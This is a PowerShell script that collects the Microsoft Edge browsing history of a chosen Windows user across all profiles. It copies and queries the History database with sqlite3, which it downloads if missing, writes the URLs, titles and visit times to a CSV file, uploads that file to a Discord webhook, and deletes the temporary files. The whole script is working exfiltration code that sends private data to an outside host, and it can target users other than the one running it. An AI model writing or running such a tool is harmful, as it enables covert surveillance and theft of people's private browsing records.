# Get Edge Browsing History for a Specific User and Send to Discord

param(
    [string]$GetUser = $env:USERNAME,
    [int]$DaysBack = 7
)

# Load environment variables from .env file
$envFile = Join-Path $PSScriptRoot ".env"
if (Test-Path $envFile) {
    Get-Content $envFile | ForEach-Object {
        if ($_ -match '^([^=]+)=(.*)$') {
            $key = $matches[1].Trim()
            $value = $matches[2].Trim()
            [Environment]::SetEnvironmentVariable($key, $value)
        }
    }
}

$webhookUrl = $env:WEBHOOK_URL
if (-not $webhookUrl) {
    Write-Error "Webhook URL not found. Ensure .env file exists in the script's directory with WEBHOOK_URL."
    exit
}

# Find all Edge profiles for the user
$edgeUserDataPath = "C:\Users\$GetUser\AppData\Local\Microsoft\Edge\User Data"
$profiles = Get-ChildItem -Path $edgeUserDataPath -Directory | Where-Object { $_.Name -eq "Default" -or $_.Name -like "Profile*" }

if (-not $profiles) {
    Write-Error "No Edge profiles found for user '$GetUser'."
    exit
}

# Calculate Chrome/Edge epoch time for filtering
$now = Get-Date
$minDate = $now.AddDays(-$DaysBack)
# Chrome/Edge epoch is Jan 1, 1601 UTC
$epoch = [datetime]::Parse('1601-01-01T00:00:00Z')
$minVisitTime = [math]::Round(($minDate.ToUniversalTime() - $epoch).TotalMilliseconds * 10)

# Process each profile
foreach ($profile in $profiles) {
    $profileName = $profile.Name
    $edgeHistoryPath = Join-Path $profile.FullName "History"
    if (-not (Test-Path $edgeHistoryPath)) {
        Write-Warning "History file not found for profile '$profileName'. Skipping."
        continue
    }

    # Copy the history file to temp (Edge may lock the file)
    $tempHistory = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "$GetUser-$profileName-EdgeHistory.db")
    Copy-Item $edgeHistoryPath $tempHistory -Force

    # Ensure sqlite3.exe is available, download if missing
    $sqliteDir = Join-Path $PSScriptRoot "sqlite-tools-win32-x86-3430100"
    $sqliteExe = Join-Path $sqliteDir "sqlite3.exe"
    if (-not (Test-Path $sqliteExe)) {
        Write-Host "sqlite3.exe not found, downloading..."
        $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"
        $zipPath = Join-Path $env:TEMP "sqlite.zip"
        Invoke-WebRequest -Uri $sqliteUrl -OutFile $zipPath
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $PSScriptRoot)
        Remove-Item $zipPath
    }

    # Query the SQLite DB for URLs
    try {
        $query = "SELECT url, title, last_visit_time FROM urls WHERE last_visit_time >= $minVisitTime ORDER BY last_visit_time DESC;"
        $history = & $sqliteExe $tempHistory "$query"
    } catch {
        Write-Error "Error querying Edge history for profile '$profileName': $_"
        Remove-Item $tempHistory
        continue
    }

# Write results to temp CSV file
    $tempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "$env:COMPUTERNAME-$GetUser-$profileName.csv")
    "Edge Browsing History for user: $GetUser, Profile: $profileName (last $DaysBack days)" | Out-File -FilePath $tempFile
    "Source: $edgeHistoryPath" | Out-File -FilePath $tempFile -Append
    "" | Out-File -FilePath $tempFile -Append

    # Parse and format history as objects
    $historyLines = $history -split "`n" | Where-Object { $_ -match '\|' }
    $data = foreach ($line in $historyLines) {
        $parts = $line -split '\|'
        if ($parts.Count -ge 3) {
            $url = $parts[0].Trim()
            $title = $parts[1].Trim()
            $visitTimeRaw = $parts[2].Trim()
            try {
                $visitTime = [DateTime]::FromFileTimeUtc([long]$visitTimeRaw * 10)
                $visitTimeFormatted = $visitTime.ToString("yyyy-MM-dd HH:mm:ss")
            } catch {
                $visitTimeFormatted = $visitTimeRaw  # Fallback to raw if conversion fails
            }
            [PSCustomObject]@{
                URL = $url
                Title = $title
                'Visit Time' = $visitTimeFormatted
            }
        }
    }

    # Export to CSV
    $data | Export-Csv -Path $tempFile -NoTypeInformation -Append

    # Send the file to Discord using HttpClient for multipart
    try {
        Add-Type -AssemblyName System.Net.Http
        $client = New-Object System.Net.Http.HttpClient
        $content = New-Object System.Net.Http.MultipartFormDataContent
        $content.Add([System.Net.Http.StringContent]::new(":file_folder: Edge history for profile '$profileName' attached."), "content")
        $fileStream = [System.IO.File]::OpenRead($tempFile)
        $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
        $content.Add($fileContent, "file", [System.IO.Path]::GetFileName($tempFile))
        $response = $client.PostAsync($webhookUrl, $content).Result
        if (-not $response.IsSuccessStatusCode) {
            Write-Error "Failed to send to Discord for profile '$profileName': $($response.StatusCode) - $($response.ReasonPhrase)"
        }
    } catch {
        Write-Error "Error sending to Discord for profile '$profileName': $_"
    } finally {
        if ($fileStream) { $fileStream.Close() }
        if ($client) { $client.Dispose() }
    }

    # Clean up temp files
    Remove-Item $tempHistory
    Remove-Item $tempFile
}
